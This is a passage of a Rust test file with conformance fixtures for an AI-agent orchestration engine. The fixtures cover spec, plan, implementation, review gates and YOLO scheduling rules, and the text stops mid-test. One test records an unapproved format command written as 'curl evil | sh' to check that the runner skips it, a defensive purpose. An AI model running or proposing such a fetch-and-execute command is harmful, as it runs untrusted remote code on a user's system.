//! Engine conformance fixtures (HANDOVER 17): one per rule ID of section 8.2. Each builds an
//! event history, folds it, and checks the planner's next steps.

use ostra_core::containment::ContainmentSignal;
use ostra_core::event::*;
use ostra_core::exec::{ExecutionResult, ExecutionStatus, Usage};
use ostra_core::ids::{DecisionId, ExecutionId, GateId, SessionId};
use ostra_core::pipeline::{Category, QuestionAnswer, StageKind, Track};
use ostra_core::{AgentName, ExecutorKind};
use ostra_engine::plan::{PlanCtx, SpawnRequest, Step, next_steps};
use ostra_engine::state::SessionState;
use pretty_assertions::assert_eq;
use serde_json::{Value, json};
use std::path::PathBuf;

struct H {
    id: SessionId,
    events: Vec<StoredEvent>,
    ctx: PlanCtx,
}

fn root() -> PathBuf {
    PathBuf::from("/ws/.ostra/sessions/s1")
}

impl H {
    fn new(projects: &[&str], options: SessionOptions) -> H {
        let mut h = H {
            id: SessionId::from("s1"),
            events: vec![],
            ctx: PlanCtx::default(),
        };
        for p in projects {
            h.ctx
                .format_commands
                .insert(p.to_string(), Some(format!("fmt-{p}")));
        }
        h.ev(SessionEvent::SessionCreated {
            kind: SessionKind::Pipeline,
            request: "Add order cancellation".into(),
            options,
            projects: projects
                .iter()
                .map(|k| ProjectRef {
                    key: k.to_string(),
                    path: PathBuf::from(format!("/code/{k}")),
                })
                .collect(),
            workspace_root: PathBuf::from("/ws"),
            session_root: root(),
            files: vec![],
            uploads: vec![],
            pinned: vec![],
            docs_book: None,
        });
        h
    }

    fn ev(&mut self, event: SessionEvent) {
        let seq = self.events.len() as i64 + 1;
        self.events.push(StoredEvent {
            seq,
            at: chrono::Utc::now(),
            event,
        });
    }

    fn state(&self) -> SessionState {
        SessionState::fold(self.id.clone(), &self.events)
    }

    fn steps(&self) -> Vec<Step> {
        next_steps(&self.state(), &self.ctx)
    }

    fn summaries(&self) -> Vec<String> {
        self.steps().iter().map(|s| s.summary()).collect()
    }

    fn decide(&mut self, judge: JudgeKind, subject: Option<&str>, output: Value) -> DecisionId {
        let id = DecisionId::new();
        self.ev(SessionEvent::DecisionMade {
            id: id.clone(),
            judge,
            subject: subject.map(String::from),
            input_summary: String::new(),
            reason: output
                .get("reason")
                .and_then(|r| r.as_str())
                .unwrap_or_default()
                .into(),
            output,
        });
        id
    }

    fn classify(&mut self, category: &str, projects: &[&str]) {
        let tasks: Vec<Value> = projects
            .iter()
            .map(|p| json!({"project": p, "task": format!("research {p}")}))
            .collect();
        self.decide(
            JudgeKind::Classify,
            None,
            json!({"category": category, "projects": projects, "explore_tasks": tasks, "opts_in": {"tests": false, "docs": false}, "reason": "r"}),
        );
    }

    fn spawn_step(&self, prefix: &str) -> SpawnRequest {
        self.steps()
            .into_iter()
            .find_map(|s| match s {
                Step::Spawn(r) if Step::Spawn(r.clone()).summary().starts_with(prefix) => Some(*r),
                _ => None,
            })
            .unwrap_or_else(|| {
                panic!(
                    "no spawn step starting with `{prefix}` in {:?}",
                    self.summaries()
                )
            })
    }

    fn start(&mut self, prefix: &str) -> (ExecutionId, SpawnRequest) {
        let req = self.spawn_step(prefix);
        let id = ExecutionId::new();
        self.ev(SessionEvent::ExecutionStarted {
            id: id.clone(),
            agent: req.agent,
            purpose: req.purpose.clone(),
            stage: req.stage,
            project: req.project.clone(),
            executor: ExecutorKind::Native,
            model: "mock:m".into(),
            params: json!({"auto_fixable_ids": ["C1"]}),
            spawn_block: String::new(),
            report_path: req.inputs.report_file.clone(),
            resumes: req.continues.clone(),
        });
        (id, req)
    }

    fn finish(&mut self, id: &ExecutionId, status: ExecutionStatus, submit: Option<Value>) {
        self.ev(SessionEvent::ExecutionFinished {
            id: id.clone(),
            result: ExecutionResult {
                status,
                submit,
                final_text: String::new(),
                usage: Usage::default(),
                native_session_id: None,
                error: (status != ExecutionStatus::Ok).then(|| "boom".into()),
            },
        });
    }

    /// Start and finish one spawn step with an Ok submit.
    fn run(&mut self, prefix: &str, submit: Value) -> SpawnRequest {
        let (id, req) = self.start(prefix);
        self.finish(&id, ExecutionStatus::Ok, Some(submit));
        req
    }

    fn open_gate(&mut self, kind: &str) -> GateId {
        let step = self
            .steps()
            .into_iter()
            .find(|s| s.summary() == format!("gate {kind}"))
            .unwrap_or_else(|| panic!("no gate {kind} in {:?}", self.summaries()));
        let Step::OpenGate {
            title,
            explanation,
            payload,
        } = step
        else {
            unreachable!()
        };
        let id = GateId::new();
        self.ev(SessionEvent::GateOpened {
            id: id.clone(),
            title,
            explanation,
            payload,
        });
        id
    }

    /// Answer as the runner does: content-bearing answers wait for the judge (Rule J1).
    fn answer(&mut self, gate: &GateId, answer: GateAnswer) {
        let payload = self
            .events
            .iter()
            .find_map(|e| match &e.event {
                SessionEvent::GateOpened { id, payload, .. } if id == gate => Some(payload.clone()),
                _ => None,
            })
            .expect("gate opened");
        let routed = ostra_engine::state::answer_needs_route(&payload, &answer);
        self.answer_as(gate, answer, routed);
    }

    fn answer_as(&mut self, gate: &GateId, answer: GateAnswer, routed: bool) {
        self.ev(SessionEvent::GateAnswered {
            id: gate.clone(),
            source: AnswerSource::User,
            answer,
            reason: None,
            routed,
        });
    }

    /// The Route answer judge's decision for a gate (Rule J1).
    fn route(&mut self, gate: &GateId, output: Value) {
        self.decide(JudgeKind::RouteAnswer, Some(gate.as_str()), output);
    }

    /// Deliver every answer of a gate, the judge's plainest decision.
    fn deliver(&mut self, gate: &GateId) {
        self.route(
            gate,
            json!({"route": "implementation_detail", "items": [], "research": [], "reason": "r"}),
        );
    }

    fn command(&mut self, purpose: CommandPurpose, project: &str) {
        self.ev(SessionEvent::CommandRan {
            purpose,
            project: project.into(),
            command: String::new(),
            exit_code: Some(0),
            output_tail: String::new(),
        });
    }

    // --- Canned flows ----------------------------------------------------------------------

    fn explored(projects: &[&str], options: SessionOptions) -> H {
        let mut h = H::new(projects, options);
        h.classify("IMPLEMENT", projects);
        for (i, _) in projects.iter().enumerate() {
            h.run(
                &format!("spawn explore explore#{i}"),
                explore_submit(i, &[]),
            );
        }
        h.decide(
            JudgeKind::Track,
            None,
            json!({"track": "full", "reason": "r"}),
        );
        h
    }

    fn spec_approved(projects: &[&str], options: SessionOptions) -> H {
        let mut h = H::explored(projects, options);
        h.run("spawn generate-spec", spec_submit(0, 1));
        h.run(
            "spawn fact-check fact-check-spec",
            fact("PASS", "spec", &[]),
        );
        let g = h.open_gate("spec_approval");
        h.answer(
            &g,
            GateAnswer::Approval {
                approved: true,
                feedback: None,
            },
        );
        h
    }

    fn plan_approved(projects: &[&str], phases: Value, options: SessionOptions) -> H {
        let mut h = H::spec_approved(projects, options);
        h.decide(
            JudgeKind::Stakes,
            None,
            json!({"stakes": "high", "reason": "r"}),
        );
        h.run("spawn plan", plan_submit(phases));
        h.run(
            "spawn fact-check fact-check-plan",
            fact("PASS", "plan", &[]),
        );
        let g = h.open_gate("plan_approval");
        h.answer(
            &g,
            GateAnswer::Approval {
                approved: true,
                feedback: None,
            },
        );
        h
    }

    /// Rule F1: accept the implementation at the review gate.
    fn accept(&mut self) {
        let g = self.open_gate("implementation_review");
        self.answer(
            &g,
            GateAnswer::Choice {
                option: "done".into(),
                text: None,
            },
        );
    }

    /// Implement and pass review for one phase.
    fn pass_phase(&mut self, phase: u32) {
        self.run(
            &format!("spawn implementer phase {phase} initial"),
            impl_submit(phase, &["src/a.rs"]),
        );
        self.run(
            &format!("spawn code-reviewer review phase {phase} #1"),
            review(&[]),
        );
        let project = self.state().phases[&phase].info.project.clone();
        self.command(CommandPurpose::Stage, &project);
    }
}

fn explore_submit(i: usize, not_covered: &[&str]) -> Value {
    json!({
        "research_path": format!("/ws/.ostra/sessions/s1/p/ostra-research-{i}.md"),
        "scope_covered": "s", "findings_summary": "f", "sources_retrieved": 0, "open_questions": 0,
        "not_covered": not_covered
    })
}

fn spec_submit(questions: usize, evidence: u32) -> Value {
    let qs: Vec<Value> = (0..questions)
        .map(|i| json!({"id": format!("Q{}", i + 1), "question": "Which?", "tag": "Scope", "options": [{"label": "A", "description": "a"}, {"label": "B", "description": "b"}], "recommended": 0}))
        .collect();
    json!({"spec_path": "/ws/.ostra/sessions/s1/ostra-spec-1.md", "open_questions": qs, "external_evidence_rows": evidence, "deliverables": 1, "requirements": 3, "summary": "spec"})
}

fn fact(verdict: &str, target: &str, findings: &[&str]) -> Value {
    let f: Vec<Value> = findings
        .iter()
        .map(|x| json!({"severity": "HIGH", "location": "L", "claim": "C", "issue": x}))
        .collect();
    json!({"verdict": verdict, "target": target, "findings": f})
}

fn plan_submit(phases: Value) -> Value {
    json!({"spec_path": "/ws/.ostra/sessions/s1/ostra-spec-1.md", "master_plan_path": "/ws/.ostra/sessions/s1/ostra-plan-1.md", "phases": phases, "stakes": "High", "summary": "plan", "step_count": 4, "requirement_coverage": "3 of 3"})
}

fn phase(id: u32, project: &str, deps: &[u32], test_policy: &str) -> Value {
    json!({"id": id, "deliverable": "D1", "project": project, "title": format!("phase {id}"), "complexity": "Medium", "test_policy": test_policy, "depends_on": deps, "file": format!("/ws/.ostra/sessions/s1/ostra-plan-1-phase-{id}.md")})
}

fn impl_submit(phase: u32, files: &[&str]) -> Value {
    json!({"status": "ok", "report_path": format!("/ws/.ostra/sessions/s1/p/ostra-implementer-phase-{phase}.md"), "changed_files": files, "summary": "done"})
}

fn finding(sev: &str, rule: &str) -> Value {
    json!({"severity": sev, "file": "src/a.rs", "rule": rule, "description": format!("{rule} problem."), "fix": "Change `a` to `b` on line 1.", "guidance": if sev == "BLOCKER" { json!("research it") } else { Value::Null }})
}

fn review(findings: &[Value]) -> Value {
    let block = findings.iter().any(|f| f["severity"] == "BLOCKER");
    json!({"findings": findings, "security_block": block, "ledger_path": "/l", "summary": "r"})
}

fn report(path: &str) -> Value {
    json!({"status": "ok", "report_path": path, "changed_files": [], "summary": "done"})
}

fn one_phase() -> Value {
    json!([phase(1, "p", &[], "Required")])
}

// ------------------------------------------------------------------------------------------
// D1, Hard 15: IMPLEMENT always passes through Spec; no research document means no Spec.
// ------------------------------------------------------------------------------------------

#[test]
fn d1_explore_leads_to_spec_never_plan() {
    let h = H::explored(&["p"], SessionOptions::default());
    let s = h.summaries();
    assert_eq!(s, vec!["spawn generate-spec spec#1"]);
}

#[test]
fn p4_yolo_leaves_a_stopped_execution_to_the_user() {
    let mut h = H::explored(
        &["p"],
        SessionOptions {
            yolo: true,
            ..Default::default()
        },
    );
    let (spec, _) = h.start("spawn generate-spec");
    h.finish(&spec, ExecutionStatus::Cancelled, None);
    let g = h.open_gate("execution_failed");
    let st = h.state();
    assert_eq!(st.gates[&g].title, "You stopped generate-spec");
    assert!(ostra_engine::judge_input::yolo_plan(&st, &g).is_none());
    assert!(
        h.summaries().is_empty(),
        "no retry and no YOLO answer: {:?}",
        h.summaries()
    );

    // A failure, unlike a stop, is still retried under YOLO.
    let mut h = H::explored(
        &["p"],
        SessionOptions {
            yolo: true,
            ..Default::default()
        },
    );
    let (spec, _) = h.start("spawn generate-spec");
    h.finish(&spec, ExecutionStatus::Denied, None);
    h.open_gate("execution_failed");
    assert_eq!(h.summaries(), vec!["yolo-answer"]);
}

#[test]
fn d1_no_research_document_means_no_spec() {
    let mut h = H::new(&["p"], SessionOptions::default());
    h.classify("IMPLEMENT", &["p"]);
    let (id, _) = h.start("spawn explore");
    h.finish(&id, ExecutionStatus::Denied, None);
    let g = h.open_gate("execution_failed");
    h.answer(
        &g,
        GateAnswer::Choice {
            option: "abandon".into(),
            text: None,
        },
    );
    assert_eq!(h.summaries(), vec!["fail"]);
}

#[test]
fn d1_implement_with_no_tasks_still_explores() {
    let mut h = H::new(&["p"], SessionOptions::default());
    h.decide(JudgeKind::Classify, None, json!({"category": "IMPLEMENT", "projects": ["p"], "explore_tasks": [], "opts_in": {"tests": false, "docs": false}, "reason": "r"}));
    assert_eq!(h.summaries(), vec!["spawn explore explore#0"]);
}

// ------------------------------------------------------------------------------------------
// D2: Spec waits for every explore and for the Sufficiency judge; it gets every document.
// ------------------------------------------------------------------------------------------

#[test]
fn d2_spec_waits_for_running_explore() {
    let mut h = H::new(&["a", "b"], SessionOptions::default());
    h.classify("IMPLEMENT", &["a", "b"]);
    // Rule M1: both explores fan out at once.
    assert_eq!(
        h.summaries(),
        vec!["spawn explore explore#0", "spawn explore explore#1"]
    );
    h.run("spawn explore explore#0", explore_submit(0, &[]));
    h.start("spawn explore explore#1");
    assert_eq!(h.summaries(), Vec::<String>::new());
}

#[test]
fn d2_not_covered_goes_to_sufficiency_and_spec_gets_every_doc() {
    let mut h = H::new(
        &["p"],
        SessionOptions {
            track: Some(Track::Full),
            ..Default::default()
        },
    );
    h.classify("IMPLEMENT", &["p"]);
    h.run(
        "spawn explore explore#0",
        explore_submit(0, &["the web client"]),
    );
    assert_eq!(h.summaries(), vec!["judge sufficiency 0"]);
    h.decide(JudgeKind::Sufficiency, Some("0"), json!({"items": [{"item": "the web client", "needed": true, "reason": "r", "task": {"project": "p", "task": "research the web client"}}], "reason": "r"}));
    assert_eq!(h.summaries(), vec!["spawn explore explore#1"]);
    h.run("spawn explore explore#1", explore_submit(1, &[]));
    let spec = h.spawn_step("spawn generate-spec");
    assert_eq!(spec.inputs.research_docs.len(), 2);
    assert!(spec.inputs.research_docs[0].ends_with("ostra-research-0.md"));
}

#[test]
fn d2_sufficiency_spawns_a_repeated_task_once() {
    let mut h = H::new(&["p"], SessionOptions::default());
    h.classify("IMPLEMENT", &["p"]);
    h.run(
        "spawn explore explore#0",
        explore_submit(0, &["statute a", "statute b", "the web client"]),
    );
    let law = json!({"project": "p", "task": "research the statutes"});
    h.decide(JudgeKind::Sufficiency, Some("0"), json!({"items": [
        {"item": "statute a", "needed": true, "reason": "r", "task": law},
        {"item": "statute b", "needed": true, "reason": "r", "task": law},
        {"item": "the web client", "needed": true, "reason": "r", "task": {"project": "p", "task": "research the web client"}}
    ], "reason": "r"}));
    assert_eq!(
        h.summaries(),
        vec!["spawn explore explore#1", "spawn explore explore#2"]
    );
}

// ------------------------------------------------------------------------------------------
// D3: open questions before any fact-check; every answer re-runs generate-spec.
// ------------------------------------------------------------------------------------------

#[test]
fn d3_questions_before_fact_check_and_answers_rerun_spec() {
    let mut h = H::explored(&["p"], SessionOptions::default());
    h.run("spawn generate-spec", spec_submit(2, 0));
    assert_eq!(h.summaries(), vec!["gate open_questions"]);
    let g = h.open_gate("open_questions");
    assert_eq!(h.summaries(), Vec::<String>::new());
    let answers = vec![
        QuestionAnswer {
            id: "Q1".into(),
            question: "Which?".into(),
            answer: "A".into(),
        },
        QuestionAnswer {
            id: "Q2".into(),
            question: "Which?".into(),
            answer: "B".into(),
        },
    ];
    h.answer(
        &g,
        GateAnswer::Questions {
            answers: answers.clone(),
        },
    );
    // Rule J1: the judge sees the answers before generate-spec does.
    assert_eq!(h.summaries(), vec![format!("judge route-answer {g}")]);
    h.deliver(&g);
    let rerun = h.spawn_step("spawn generate-spec");
    assert_eq!(rerun.inputs.answers, answers);
    assert!(
        rerun.inputs.spec_file.is_some(),
        "the rerun rewrites the spec in place"
    );
}

// ------------------------------------------------------------------------------------------
// D3a: Prior findings are `none` once, then the previous pass's findings verbatim.
// ------------------------------------------------------------------------------------------

#[test]
fn d3a_prior_findings() {
    let mut h = H::explored(&["p"], SessionOptions::default());
    h.run("spawn generate-spec", spec_submit(0, 0));
    let first = h.spawn_step("spawn fact-check");
    assert_eq!(first.inputs.prior_findings.as_deref(), Some("none"));
    h.run(
        "spawn fact-check",
        fact("FAIL", "spec", &["step 2.3 calls a missing method"]),
    );
    let rerun = h.spawn_step("spawn generate-spec");
    assert!(
        rerun
            .inputs
            .findings
            .as_deref()
            .unwrap()
            .contains("step 2.3 calls a missing method")
    );
    h.run("spawn generate-spec", spec_submit(0, 0));
    let second = h.spawn_step("spawn fact-check");
    assert_eq!(
        second.inputs.prior_findings.as_deref(),
        Some("HIGH, L: C step 2.3 calls a missing method")
    );
    h.run("spawn fact-check", fact("PASS", "spec", &[]));
    let g = h.open_gate("spec_approval");
    h.answer(
        &g,
        GateAnswer::Approval {
            approved: false,
            feedback: Some("Drop the retry logic".into()),
        },
    );
    h.deliver(&g);
    h.run("spawn generate-spec", spec_submit(0, 0));
    let third = h.spawn_step("spawn fact-check");
    assert_eq!(
        third.inputs.prior_findings.as_deref(),
        Some("no findings on the previous pass"),
        "a clean pass still makes a re-pass"
    );
}

// ------------------------------------------------------------------------------------------
// D3b: refetch only on a spec's first pass with External Evidence rows.
// ------------------------------------------------------------------------------------------

#[test]
fn d3b_source_check() {
    let mut h = H::explored(&["p"], SessionOptions::default());
    h.run("spawn generate-spec", spec_submit(0, 2));
    assert_eq!(
        h.spawn_step("spawn fact-check")
            .inputs
            .source_check
            .as_deref(),
        Some("refetch")
    );
    h.run("spawn fact-check", fact("FAIL", "spec", &["x"]));
    h.run("spawn generate-spec", spec_submit(0, 2));
    assert_eq!(
        h.spawn_step("spawn fact-check")
            .inputs
            .source_check
            .as_deref(),
        Some("citations")
    );

    let mut h = H::explored(&["p"], SessionOptions::default());
    h.run("spawn generate-spec", spec_submit(0, 0));
    assert_eq!(
        h.spawn_step("spawn fact-check")
            .inputs
            .source_check
            .as_deref(),
        Some("citations")
    );
}

// ------------------------------------------------------------------------------------------
// D4, Hard 16: the plan reads the spec and nothing else.
// ------------------------------------------------------------------------------------------

#[test]
fn d4_plan_gets_only_the_spec() {
    let mut h = H::spec_approved(&["p"], SessionOptions::default());
    assert_eq!(h.summaries(), vec!["judge stakes"]);
    h.decide(
        JudgeKind::Stakes,
        None,
        json!({"stakes": "medium", "reason": "r"}),
    );
    let plan = h.spawn_step("spawn plan");
    assert!(plan.inputs.research_docs.is_empty());
    assert!(plan.inputs.answers.is_empty());
    assert!(plan.inputs.task.is_none());
    // Rule D4a: what research found about the code arrives as the facts file, never the documents.
    assert_eq!(plan.inputs.code_facts, h.state().research_docs());
    assert!(plan.inputs.wants_code_facts_file());
    assert!(plan.inputs.revise_phases.is_empty());
    assert_eq!(
        plan.inputs.spec_file,
        Some(PathBuf::from("/ws/.ostra/sessions/s1/ostra-spec-1.md"))
    );
    assert_eq!(plan.session_dir, root());
}

// ------------------------------------------------------------------------------------------
// D2a: the spec side reads the research documents and learns which cited files changed since.
// ------------------------------------------------------------------------------------------

#[test]
fn d2a_spec_side_gets_what_changed_since_research() {
    let mut h = H::explored(&["p"], SessionOptions::default());
    let docs = h.state().research_docs();
    assert_eq!(docs.len(), 1);
    let spec = h.spawn_step("spawn generate-spec");
    assert_eq!(spec.inputs.research_docs, docs);
    assert_eq!(spec.inputs.code_facts, docs);
    assert!(
        !spec.inputs.wants_code_facts_file(),
        "an agent that reads the documents gets only what changed"
    );
    h.run("spawn generate-spec", spec_submit(0, 0));
    let fc = h.spawn_step("spawn fact-check");
    assert_eq!(fc.inputs.code_facts, docs);
    assert!(!fc.inputs.wants_code_facts_file());
}

// ------------------------------------------------------------------------------------------
// D4b: a plan re-spawn on fact-check findings gets the phases the findings name.
// ------------------------------------------------------------------------------------------

#[test]
fn d4b_plan_revision_gets_the_phases_the_findings_name() {
    let mut h = H::spec_approved(&["p"], SessionOptions::default());
    h.decide(
        JudgeKind::Stakes,
        None,
        json!({"stakes": "high", "reason": "r"}),
    );
    h.run(
        "spawn plan",
        plan_submit(json!([
            phase(1, "p", &[], "Required"),
            phase(2, "p", &[1], "Required"),
            phase(3, "p", &[2], "Required")
        ])),
    );
    h.run(
        "spawn fact-check fact-check-plan",
        json!({"verdict": "FAIL", "target": "plan", "findings": [
            {"severity": "HIGH", "location": "ostra-plan-1-phase-3.md, Step 3.2 Action", "claim": "c", "issue": "i"},
            {"severity": "MEDIUM", "location": "Phase Index", "element": "step 1.4", "claim": "c", "issue": "i"},
            {"severity": "HIGH", "location": "phase 9", "claim": "c", "issue": "a phase the plan does not have"}
        ]}),
    );
    let rerun = h.spawn_step("spawn plan");
    assert_eq!(rerun.inputs.revise_phases, vec![1, 3]);
    assert!(rerun.inputs.findings.is_some());
    assert!(rerun.inputs.wants_code_facts_file());
}

#[test]
fn stakes_low_skips_plan() {
    let mut h = H::spec_approved(&["p"], SessionOptions::default());
    h.decide(
        JudgeKind::Stakes,
        None,
        json!({"stakes": "low", "reason": "small"}),
    );
    let s = h.summaries();
    assert_eq!(s, vec!["spawn implementer phase 1 initial"]);
    let req = h.spawn_step("spawn implementer");
    assert!(
        req.inputs.phase.as_ref().unwrap().file.is_none(),
        "Hard rule 13: no plan means No plan:"
    );
}

// ------------------------------------------------------------------------------------------
// D5: plan fact-check uses citations and the approved spec; approval needs PASS.
// ------------------------------------------------------------------------------------------

#[test]
fn d5_plan_fact_check_and_approval() {
    let mut h = H::spec_approved(&["p"], SessionOptions::default());
    h.decide(
        JudgeKind::Stakes,
        None,
        json!({"stakes": "high", "reason": "r"}),
    );
    h.run("spawn plan", plan_submit(one_phase()));
    let fc = h.spawn_step("spawn fact-check fact-check-plan");
    assert_eq!(fc.inputs.source_check.as_deref(), Some("citations"));
    assert_eq!(
        fc.inputs.spec_file,
        Some(PathBuf::from("/ws/.ostra/sessions/s1/ostra-spec-1.md"))
    );
    assert!(fc.inputs.research_docs.is_empty());
    // Rule D4a: the plan fact-check checks against the facts the plan had.
    assert!(fc.inputs.wants_code_facts_file());
    h.run(
        "spawn fact-check fact-check-plan",
        fact("FAIL", "plan", &["phase 5 missing"]),
    );
    let rerun = h.spawn_step("spawn plan");
    assert!(
        rerun
            .inputs
            .findings
            .as_deref()
            .unwrap()
            .contains("phase 5 missing")
    );
    assert!(
        !h.summaries().iter().any(|s| s == "gate plan_approval"),
        "no approval without PASS"
    );
}

#[test]
fn approval_without_pass_is_ignored_by_the_fold() {
    let mut h = H::explored(&["p"], SessionOptions::default());
    h.run("spawn generate-spec", spec_submit(0, 0));
    h.run("spawn fact-check", fact("PASS", "spec", &[]));
    let g = h.open_gate("spec_approval");
    // A new spec version lands before the answer: its PASS no longer covers it.
    h.ev(SessionEvent::RequestAmended {
        text: "also refunds".into(),
        files: vec![],
        uploads: vec![],
        delivery: ContextDelivery::Queue,
        routed: false,
    });
    h.answer(
        &g,
        GateAnswer::Approval {
            approved: true,
            feedback: None,
        },
    );
    assert!(!h.state().spec.approved);
}

// ------------------------------------------------------------------------------------------
// D6, D7, M2 to M6: the scheduler.
// ------------------------------------------------------------------------------------------

#[test]
fn d6_m2_m3_m5_scheduling() {
    let phases = json!([
        phase(1, "api", &[], "Required"),
        phase(2, "web", &[1], "Required"),
        phase(3, "api", &[], "Required"),
        phase(4, "web", &[99], "Required"),
    ]);
    let mut h = H::plan_approved(&["api", "web"], phases, SessionOptions::default());
    // M2: one pipeline per project; M3: phase 2 waits for phase 1; M5: phase 4's unreadable
    // dependency means it depends on every earlier phase.
    assert_eq!(h.summaries(), vec!["spawn implementer phase 1 initial"]);
    h.pass_phase(1);
    // Ready phases in different projects run in parallel.
    assert_eq!(
        h.summaries(),
        vec![
            "spawn implementer phase 2 initial",
            "spawn implementer phase 3 initial"
        ]
    );
    h.pass_phase(2);
    h.pass_phase(3);
    // Rule F1: api waits for the implementation review, because feedback can add a phase to it.
    assert_eq!(h.summaries(), vec!["spawn implementer phase 4 initial"]);
    h.pass_phase(4);
    h.accept();
    // Rule D8: format runs once per project after its last phase.
    assert_eq!(
        h.summaries(),
        vec!["command format api", "command format web"]
    );
}

// ------------------------------------------------------------------------------------------
// D8, T1 to T7: format once, closing gate once per project, tests and docs only after.
// ------------------------------------------------------------------------------------------

#[test]
fn d8_t1_no_tests_between_phases_and_format_once() {
    let phases = json!([phase(1, "p", &[], "Required"), phase(2, "p", &[1], "Skip")]);
    let mut h = H::plan_approved(
        &["p"],
        phases,
        SessionOptions {
            tests: true,
            ..Default::default()
        },
    );
    h.pass_phase(1);
    assert_eq!(
        h.summaries(),
        vec!["spawn implementer phase 2 initial"],
        "T1: no EPA between phases"
    );
    h.pass_phase(2);
    assert_eq!(h.summaries(), vec!["gate implementation_review"]);
    h.accept();
    assert_eq!(h.summaries(), vec!["command format p"]);
    h.command(CommandPurpose::Format, "p");
    // T3: tests were requested, so the gate asks only about docs.
    let g = h.open_gate("closing_gate");
    let st = h.state();
    let GatePayload::ClosingGate { items } = &st.gates[&g].payload else {
        panic!()
    };
    assert!(!items[0].ask_tests && items[0].ask_docs);
    h.answer(
        &g,
        GateAnswer::Closing {
            items: vec![ClosingChoice {
                project: "p".into(),
                tests: false,
                docs: false,
            }],
        },
    );
    // T4: only the Required phase is covered.
    assert_eq!(
        h.summaries(),
        vec!["spawn execution-path-analyzer epa phase 1"]
    );
}

#[test]
fn t4_epa_fans_out_and_write_test_is_serial() {
    let phases = json!([
        phase(1, "p", &[], "Required"),
        phase(2, "p", &[1], "Required")
    ]);
    let mut h = H::plan_approved(
        &["p"],
        phases,
        SessionOptions {
            tests: true,
            docs: true,
            yolo: false,
            track: None,
        },
    );
    h.pass_phase(1);
    h.pass_phase(2);
    h.accept();
    h.command(CommandPurpose::Format, "p");
    // T3: both requested, so there is no gate at all.
    assert_eq!(
        h.summaries(),
        vec![
            "spawn execution-path-analyzer epa phase 1",
            "spawn execution-path-analyzer epa phase 2"
        ]
    );
    let (e1, _) = h.start("spawn execution-path-analyzer epa phase 1");
    let (e2, _) = h.start("spawn execution-path-analyzer epa phase 2");
    h.finish(&e1, ExecutionStatus::Ok, Some(report("/e1")));
    assert_eq!(
        h.summaries(),
        vec![] as Vec<String>,
        "write-test waits for every EPA"
    );
    h.finish(&e2, ExecutionStatus::Ok, Some(report("/e2")));
    assert_eq!(
        h.summaries(),
        vec!["spawn write-test write-test phase 1 initial"]
    );
    h.run("spawn write-test write-test phase 1", report("/t1"));
    assert_eq!(
        h.summaries(),
        vec!["spawn code-reviewer review phase 1 tests #1"]
    );
    let r = h.spawn_step("spawn code-reviewer");
    assert_eq!(r.inputs.phase_value.as_deref(), Some("1-tests"));
    assert_eq!(r.inputs.epa_report, Some(PathBuf::from("/e1")));
    h.run("spawn code-reviewer", review(&[]));
    // Test files are staged per phase after that phase's test review passes.
    assert_eq!(h.summaries(), vec!["command stage p"]);
    h.command(CommandPurpose::Stage, "p");
    assert_eq!(
        h.summaries(),
        vec!["spawn write-test write-test phase 2 initial"]
    );
}

#[test]
fn d9_a_stuck_test_phase_left_blocked_is_announced_then_completes() {
    let phases = json!([phase(1, "p", &[], "Required")]);
    let mut h = H::plan_approved(
        &["p"],
        phases,
        SessionOptions {
            tests: true,
            docs: false,
            yolo: false,
            track: None,
        },
    );
    h.pass_phase(1);
    h.accept();
    h.command(CommandPurpose::Format, "p");
    let g = h.open_gate("closing_gate");
    h.answer(
        &g,
        GateAnswer::Closing {
            items: vec![ClosingChoice {
                project: "p".into(),
                tests: true,
                docs: false,
            }],
        },
    );
    h.run("spawn execution-path-analyzer epa phase 1", report("/e1"));
    let (id, _) = h.start("spawn write-test write-test phase 1 initial");
    h.finish(
        &id,
        ExecutionStatus::Ok,
        Some(json!({"status": "stuck", "report_path": "/t1", "changed_files": [], "summary": "s",
                     "stuck": {"diagnostic": "EROFS: read-only file system", "need": "a writable cache"}})),
    );
    h.decide(
        JudgeKind::Rescue,
        Some(id.as_str()),
        json!({"action": "gate", "reason": "r"}),
    );
    let g = h.open_gate("stuck");
    h.answer(
        &g,
        GateAnswer::Choice {
            option: "block".into(),
            text: None,
        },
    );
    assert_eq!(h.summaries(), vec!["blocked phase 1"]);
    h.ev(SessionEvent::PhaseBlocked {
        project: "p".into(),
        phase: 1,
        tests: true,
        reason: "Stuck: a writable cache".into(),
    });
    assert_eq!(h.summaries(), vec!["judge completion"]);
}

#[test]
fn a1_an_unapproved_format_command_is_skipped_once() {
    let phases = json!([phase(1, "p", &[], "Required")]);
    let mut h = H::plan_approved(&["p"], phases, SessionOptions::default());
    h.pass_phase(1);
    h.accept();
    assert_eq!(h.summaries(), vec!["command format p"]);
    // Rule A1: the runner records the skip as a format step with no exit code.
    h.ev(SessionEvent::CommandRan {
        purpose: CommandPurpose::Format,
        project: "p".into(),
        command: "curl evil | sh".into(),
        exit_code: None,
        output_tail: ostra_engine::runner::FORMAT_NOT_APPROVED.into(),
    });
    let st = h.state();
    assert_eq!(st.project_tracks["p"].format, Some(None));
    assert!(
        !h.summaries()
            .iter()
            .any(|s| s.starts_with("command format")),
        "format is not asked for again: {:?}",
        h.summaries()
    );
}

#[test]
fn t6_closing_gate_is_batched() {
    let phases = json!([
        phase(1, "a", &[], "Required"),
        phase(2, "b", &[], "Required")
    ]);
    let mut h = H::plan_approved(&["a", "b"], phases, SessionOptions::default());
    h.pass_phase(1);
    h.pass_phase(2);
    h.accept();
    h.command(CommandPurpose::Format, "a");
    h.command(CommandPurpose::Format, "b");
    let steps = h.steps();
    let gates: Vec<&Step> = steps
        .iter()
        .filter(|s| s.summary() == "gate closing_gate")
        .collect();
    assert_eq!(gates.len(), 1);
    let Step::OpenGate {
        payload: GatePayload::ClosingGate { items },
        ..
    } = gates[0]
    else {
        panic!()
    };
    assert_eq!(items.len(), 2);
}

#[test]
fn t2_yolo_answers_the_closing_gate() {
    let mut h = H::plan_approved(&["p"], one_phase(), SessionOptions::default());
    h.pass_phase(1);
    h.accept();
    h.command(CommandPurpose::Format, "p");
    h.open_gate("closing_gate");
    h.ev(SessionEvent::YoloSet { enabled: true });
    assert!(h.summaries().contains(&"yolo-answer".to_string()));
}

// ------------------------------------------------------------------------------------------
// D9: a failed phase removes its dependents; independent phases continue.
// ------------------------------------------------------------------------------------------

#[test]
fn d9_blocked_phase_removes_dependents() {
    let phases = json!([
        phase(1, "a", &[], "Required"),
        phase(2, "a", &[1], "Required"),
        phase(3, "b", &[], "Required")
    ]);
    let mut h = H::plan_approved(&["a", "b"], phases, SessionOptions::default());
    let (id, _) = h.start("spawn implementer phase 1");
